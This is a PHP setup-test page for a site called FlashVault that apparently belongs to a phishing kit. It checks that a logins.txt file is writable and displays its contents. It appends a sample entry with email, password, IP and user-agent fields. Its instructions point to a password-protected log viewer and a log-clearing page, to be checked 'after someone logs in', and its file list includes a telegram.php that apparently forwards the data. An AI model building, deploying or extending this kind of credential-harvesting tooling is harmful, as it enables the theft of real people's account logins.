<?php

echo "<h1>🔧 FlashVault Setup Test - flashvault.fwh.is</h1>";

// Check if files exist

echo "<h2>📁 File Check:</h2>";

$files = ['index.html', 'styles.css', 'script.js', 'telegram.php', 'view.php', 'clear.php'];

foreach ($files as $file) {

    if (file_exists($file)) {

        echo "✅ $file exists<br>";

    } else {

        echo "❌ $file MISSING<br>";

    }

}

// Check write permissions

echo "<h2>📝 Write Permissions:</h2>";

$testFile = 'logins.txt';

if (file_exists($testFile)) {

    if (is_writable($testFile)) {

        echo "✅ logins.txt is writable<br>";

        $size = filesize($testFile);

        echo "📊 File size: " . $size . " bytes<br>";

    } else {

        echo "❌ logins.txt is NOT writable<br>";

    }

} else {

    // Try to create it

    if (file_put_contents($testFile, "Test write " . date('Y-m-d H:i:s') . "\n")) {

        echo "✅ Successfully created logins.txt<br>";

    } else {

        echo "❌ Cannot create logins.txt - check folder permissions<br>";

    }

}

// Check PHP version

echo "<h2>⚙️ PHP Info:</h2>";

echo "PHP Version: " . phpversion() . "<br>";

echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";

echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "<br>";

// Show current logs

echo "<h2>📋 Current Logs:</h2>";

if (file_exists('logins.txt')) {

    $logs = file_get_contents('logins.txt');

    if (empty($logs)) {

        echo "No logs yet<br>";

    } else {

        echo "<pre style='background:#111; color:#0f0; padding:10px; border-radius:5px;'>" . htmlspecialchars($logs) . "</pre>";

    }

} else {

    echo "No logs file yet<br>";

}

// Instructions

echo "<h2>📌 Instructions:</h2>";

echo "1. Main site: <a href='http://flashvault.fwh.is' target='_blank'>http://flashvault.fwh.is</a><br>";

echo "2. View logs: <a href='view.php?p=flashvault2025' target='_blank'>view.php?p=flashvault2025</a><br>";

echo "3. Password for viewer: flashvault2025<br>";

echo "4. Clear logs: <a href='clear.php?p=flashvault2025' target='_blank'>clear.php?p=flashvault2025</a><br>";

echo "5. After someone logs in, check the viewer link above<br>";

// Test write

echo "<h2>🧪 Quick Test:</h2>";

$testData = [

    'type' => 'test',

    'email' => 'test@example.com',

    'password' => 'test123',

    'ip' => '127.0.0.1',

    'userAgent' => 'Test Script',

    'time' => date('Y-m-d H:i:s')

];

$testEntry = "========================================\n";

$testEntry .= "TIME: " . $testData['time'] . "\n";

$testEntry .= "PLATFORM: TEST\n";

$testEntry .= "EMAIL: " . $testData['email'] . "\n";

$testEntry .= "PASSWORD: " . $testData['password'] . "\n";

$testEntry .= "IP: " . $testData['ip'] . "\n";

$testEntry .= "USER AGENT: Test Entry\n";

$testEntry .= "========================================\n\n";

if (file_put_contents('logins.txt', $testEntry, FILE_APPEND | LOCK_EX)) {

    echo "✅ Test entry added to logs<br>";

} else {

    echo "❌ Failed to add test entry<br>";

}

?>